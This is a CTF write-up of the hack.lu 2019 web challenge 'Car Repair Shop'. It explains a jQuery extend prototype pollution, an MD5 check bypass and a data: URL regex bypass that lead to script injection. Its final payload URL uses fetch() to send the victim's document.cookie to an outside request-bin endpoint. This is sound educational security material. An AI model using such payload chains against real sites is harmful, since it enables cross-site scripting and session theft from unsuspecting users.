{"id":"2019-10-24-hack.lu-2019-car-repair-shop","title":"hack.lu 2019 - Car Repair Shop","year":"2019","created":"2019-10-24","html":"<h1 id=\"hacklu-2019---car-repair-shop\">hack.lu 2019 - Car Repair Shop</h1>\n<ul>\n<li>Category: web</li>\n<li>Author(s): kunte_</li>\n<li>Difficulty: medium</li>\n<li>Solves: 10 / 972</li>\n</ul>\n<p>Challenge Description:</p>\n<blockquote>\n<p>&quot;Your Car broke down?! Come to our shop, we repair all cars! Even very old ones.&quot;</p>\n<p><a href=\"https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/\">Enter the Shop</a></p>\n</blockquote>\n<h2 id=\"analysis\">Analysis</h2>\n<p>After accessing the URL of the challenge description the following page showed up:</p>\n<p><img src=\"/posts/2019-10-24-hack.lu-2019-car-repair-shop/car-repair-shop.png\" alt=\"car repair shop\"></p>\n<p>Here we can see several buttons which will execute certain functions when clicked. Below there is a message box which gets updated after some function was executed.\nAt the bottom there was another button named <code>Get your cookie!</code> which lead to a <a href=\"https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/submit/\">subpage</a> where a URL could be sumitted.\nThe submitted URL would then be visited by an automated browser.</p>\n<p>So the big picture looked like we had to craft a URL containing a payload and submit it. When it gets visited we have to exfiltrate the flag somehow. The button name suggested that the flag was in the cookie.</p>\n<p>The page was small and contained (among others) the following interesting files:</p>\n<ul>\n<li>index.html</li>\n<li>car.class.js</li>\n<li>util.js</li>\n<li>jquery.min.js</li>\n<li>jquery.md5.js</li>\n</ul>\n<p><code>util.js</code> was responsible for setting up the page like event handlers and then started to execute some code:</p>\n<pre><code class=\"language-js\"><span class=\"hljs-keyword\">const</span> urlParams = <span class=\"hljs-keyword\">new</span> URLSearchParams(<span class=\"hljs-built_in\">window</span>.location.search)\n<span class=\"hljs-keyword\">const</span> h = location.hash.slice(<span class=\"hljs-number\">1</span>)\n<span class=\"hljs-keyword\">const</span> bugatti = <span class=\"hljs-keyword\">new</span> Car(<span class=\"hljs-string\">'Bugatti'</span>, <span class=\"hljs-string\">'T35'</span>, <span class=\"hljs-string\">'green'</span>, <span class=\"hljs-string\">'assets/images/bugatti.png'</span>)\n<span class=\"hljs-keyword\">const</span> porsche = <span class=\"hljs-keyword\">new</span> Car(<span class=\"hljs-string\">'Porsche'</span>, <span class=\"hljs-string\">'911'</span>, <span class=\"hljs-string\">'yellow'</span>, <span class=\"hljs-string\">'assets/images/porsche.png'</span>)\n\n[...]\n\n    <span class=\"hljs-keyword\">if</span>(h.includes(<span class=\"hljs-string\">'Bugatti'</span>))\n        autoStart(bugatti)\n    <span class=\"hljs-keyword\">if</span>(h.includes(<span class=\"hljs-string\">'Porsche'</span>))\n        autoStart(porsche)</code></pre>\n<p>The <code>autoStart</code>-function will execute the <code>repair</code>, <code>ignition</code> and <code>powerOn</code> methods of the car passed as argument. The respective code can be found in <code>car.class.js</code>. The <code>repair</code>-function accesses the URL and parses a JSON-object of the query parameter with the same name as the function:</p>\n<pre><code class=\"language-js\">    repair() {\n        <span class=\"hljs-keyword\">if</span>(urlParams.has(<span class=\"hljs-string\">'repair'</span>)) {\n            $.extend(<span class=\"hljs-literal\">true</span>, <span class=\"hljs-keyword\">this</span>, <span class=\"hljs-built_in\">JSON</span>.parse(urlParams.get(<span class=\"hljs-string\">'repair'</span>)))\n        }\n    }</code></pre>\n<p>This code will merge the attributes and values provided in the JSON object with the <code>Car</code> object. This is dangerous and opens a prototype pollution vulnerability as described <a href=\"https://snyk.io/blog/after-three-years-of-silence-a-new-jquery-prototype-pollution-vulnerability-emerges-once-again/\">here</a>. We can overwrite the <code>__proto__</code> attribute of the <code>Car</code> and introduce new attributes.</p>\n<p>Next the <code>ignition</code>-function is called:</p>\n<pre><code class=\"language-js\">    ignition() {\n        <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-keyword\">this</span>.key == <span class=\"hljs-string\">\"\"</span>) {\n            infobox(<span class=\"hljs-string\">`Looks like the key got lost. No wonder the car is not starting ...`</span>)\n        }\n        <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-keyword\">this</span>.key == <span class=\"hljs-string\">\"ðŸ”‘\"</span>) {\n            infobox(<span class=\"hljs-string\">`The car started!`</span>)\n            <span class=\"hljs-keyword\">this</span>.start()\n        }\n    }</code></pre>\n<p>We need to set the key property of the <code>Car</code>-object to get it started. Otherwise the last of the three functions <code>powerOn</code> will not get us to the next car:</p>\n<pre><code class=\"language-js\">    powerOn() {\n        <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-keyword\">this</span>.isStarted()) {\n            infobox(<span class=\"hljs-string\">`Well Done!`</span>)\n            nextCar()\n\n        } <span class=\"hljs-keyword\">else</span> {\n            $(<span class=\"hljs-string\">'.chargeup'</span>)[<span class=\"hljs-number\">0</span>].play()\n        }\n    }</code></pre>\n<pre><code class=\"language-js\"><span class=\"hljs-keyword\">const</span> cars = [bugatti, porsche]\n\n[...]\n\n<span class=\"hljs-keyword\">const</span> nextCar = <span class=\"hljs-function\"><span class=\"hljs-params\">()</span> =&gt;</span> {\n    cars.push(cars.shift())\n    $(<span class=\"hljs-string\">\".image\"</span>).attr(<span class=\"hljs-string\">'src'</span>, cars[<span class=\"hljs-number\">0</span>].pic);\n}</code></pre>\n<p>To repair the <code>bugatti</code> we can just specify the <code>key</code> with the value of the emoji in the URL and the <code>repair</code>-function will do its job:</p>\n<pre><code class=\"language-text\">https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/?repair={%22key%22:%22%F0%9F%94%91%22}</code></pre>\n<p>This will bring us to the <code>porsche</code>. Here there were some customizations made to the <code>repair</code> and ignition functions:</p>\n<pre><code class=\"language-js\">porsche.repair = <span class=\"hljs-function\"><span class=\"hljs-params\">()</span> =&gt;</span> {\n    <span class=\"hljs-keyword\">if</span>(!bugatti.isStarted()){\n        infobox(<span class=\"hljs-string\">`Not so fast. Repair the other car first!`</span>)\n    }\n    <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>($.md5(porsche) == <span class=\"hljs-string\">'9cdfb439c7876e703e307864c9167a15'</span>){\n        <span class=\"hljs-keyword\">if</span>(urlParams.has(<span class=\"hljs-string\">'help'</span>)) {\n            repairWithHelper(urlParams.get(<span class=\"hljs-string\">'help'</span>))\n        }\n    }\n    <span class=\"hljs-keyword\">else</span>{\n        infobox(<span class=\"hljs-string\">`Repairing this is not that easy.`</span>)\n    }\n}\nporsche.ignition = <span class=\"hljs-function\"><span class=\"hljs-params\">()</span> =&gt;</span> {\n    infobox(<span class=\"hljs-string\">`Hmm ... WTF!`</span>)\n}</code></pre>\n<p>Here the <code>ignition</code>-function does not matter as it simply outputs some text. The <code>repair</code>-function however has some special requirements:</p>\n<ol>\n<li>The <code>bugatti</code> needs to be started before.</li>\n<li>The <code>md5</code> of the <code>porsche</code>-object needs to be <code>9cdfb439c7876e703e307864c9167a15</code></li>\n</ol>\n<p>(1) is already achieved with the correct <code>key</code> in the URL and should be satisfied.\n(2) needs to be done. The MD5 hash is actually the hash of the string <code>lol</code> (see your favorite hash lookup table, e.g. crackstation.net).\nSo how is the hash computed of an object? Looking at the code of <code>jquery.md5.js</code> it shows that the hash will be computed of the string representation of the object which is obtained through the <code>toString</code> method.\nTo change the string representation of an object we would need to overwrite this method, but this is not possible in this case.\nWe cannot create or change methods with the jQuery extend of the <code>repair</code>-function, only properties, because of JSON.</p>\n<p>To solve this problem we can use an interesting property of JavaScript arrays and the prototype pollution mentioned before.\nWhen an array is converted to a string in JavaScript it will become a string representation of its elements joined by <code>,</code>.\nSo for example <code>[&quot;lol&quot;]</code> becomes <code>&quot;lol&quot;</code>.\nNow combined with prototype pollution this can be easily verified with:</p>\n<pre><code class=\"language-js\">$.md5({<span class=\"hljs-attr\">__proto__</span>:[<span class=\"hljs-string\">\"lol\"</span>]}) == <span class=\"hljs-string\">'9cdfb439c7876e703e307864c9167a15'</span></code></pre>\n<p>However in the payload we cannot set the prototype directly to our array, otherwise we lose the functionality provided by the <code>Car</code> class.\nWe can circumvent this by not directly setting the prototype to the array but to an object with the prototype set to the array: <code>{&quot;__proto__&quot;: {&quot;__proto__&quot;: [&quot;lol&quot;]}}</code><br><em>This indirection through another object was discovered by team member &quot;Smashing&quot; while I was taking the bus from the conference back to the hotel. So this was a pleasant surprise and spared me some time ;)</em></p>\n<p>The new payload looks like the following now:</p>\n<pre><code class=\"language-text\">https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/?repair={%22key%22:%22%F0%9F%94%91%22,%22__proto__%22:%20{%22__proto__%22:%20[%22lol%22]}}#BugattiPorsche</code></pre>\n<p>With this we can bypass the MD5 check and get to the <code>repairWithHelper</code> function used in the <code>porsche</code>-<code>repair</code>-function:</p>\n<pre><code class=\"language-js\"><span class=\"hljs-keyword\">const</span> repairWithHelper = <span class=\"hljs-function\">(<span class=\"hljs-params\">src</span>) =&gt;</span> {\n    <span class=\"hljs-comment\">/* who needs csp anyways !? */</span>\n    urlRegx = <span class=\"hljs-regexp\">/^\\w{4,5}:\\/\\/car-repair-shop\\.fluxfingersforfuture\\.fluxfingers\\.net\\/[\\w\\d]+\\/.+\\.js$/</span>;\n    <span class=\"hljs-keyword\">if</span> (urlRegx.test(src)) {\n        <span class=\"hljs-keyword\">let</span> s = <span class=\"hljs-built_in\">document</span>.createElement(<span class=\"hljs-string\">'script'</span>)\n        s.src = src\n        $(<span class=\"hljs-string\">'head'</span>).append(s)\n    }\n}</code></pre>\n<p>Here we can see that it creates a script and sets its <code>src</code>-attribute to the URL provided as argument of the function.\nThis argument can be controlled with the <code>help</code> query parameter.\nThe problem we face is the regex which seems to be very restrictive.\nOnly the last part of the URL (the filename) allows arbitrary characters.\nAfter some testing I discovered that a data-URL would match the regex <code>data:[&lt;MIME-Type&gt;][;charset=&lt;Charset&gt;][;base64],&lt;Data&gt;</code>.\nThere was only the uncertainty if it would load with some garbage content type as the required <code>*.fluxfingers.net</code> hostname would be placed there.\nTo my surprise this worked and I was able to pop an <code>alert(1)</code> with <code>help</code> set to:</p>\n<pre><code class=\"language-text\">help=data://car-repair-shop.fluxfingersforfuture.fluxfingers.net/text/javascript,alert(1)//.js</code></pre>\n<p>The updated payload URL:</p>\n<pre><code class=\"language-text\">https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/?repair={%22key%22:%22%F0%9F%94%91%22,%22__proto__%22:%20{%22__proto__%22:%20[%22lol%22],%20%22dotAll%22:true}}&amp;help=data://car-repair-shop.fluxfingersforfuture.fluxfingers.net/text/javascript,alert(1)//.js#BugattiPorsche</code></pre>\n<p>So now we have the full exploit chain together. The only missing part is reading the flag.</p>\n<h2 id=\"solution\">Solution</h2>\n<p>The final payload, which gave us the flag, looked like the following:</p>\n<pre><code class=\"language-text\">https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/?repair={%22key%22:%22%F0%9F%94%91%22,%22__proto__%22:%20{%22__proto__%22:%20[%22lol%22],%20%22dotAll%22:true}}&amp;help=data://car-repair-shop.fluxfingersforfuture.fluxfingers.net/text/javascript,fetch(%22https://en7f8h9cynsmk.x.pipedream.net/%22%2Bdocument.cookie)//.js#BugattiPorsche</code></pre>\n<p>It extracts the <code>cookie</code> and sends it as part of the URL with <code>fetch</code> to an HTTP-endpoint controlled by us. RequestBin.com and similar sites are very useful for that. There we can inspect the requests and see what the visitor of our payload URL will send.</p>\n<p><img src=\"/posts/2019-10-24-hack.lu-2019-car-repair-shop/flag-requestbin.png\" alt=\"flag exfiltrated to requestbin\"></p>\n<p>Finally we got the correct flag: <code>flag{brumm_brumm_brumm_brumm_brumm_brumm_brumm}</code></p>\n<h2 id=\"notes\">Notes</h2>\n<p>I solved this challenge 20 minutes before the end of the CTF.\nThis changed our ranking from 4th of the local teams to 3rd and we won 500â‚¬ which was pretty cool.\nOf course this was only possible with the awesome contributions and solved challenges of the other players of the <a href=\"https://w0y.at\">W0Y-CTF-team</a>.</p>\n<p>Hack.lu 2019 was an awesome conference with a very nice CTF with many (30) challenges of different categories.\nThanks to <a href=\"https://fluxfingers.net/\">Fluxfingers</a> for organizing it.</p>\n","lastUpdate":""}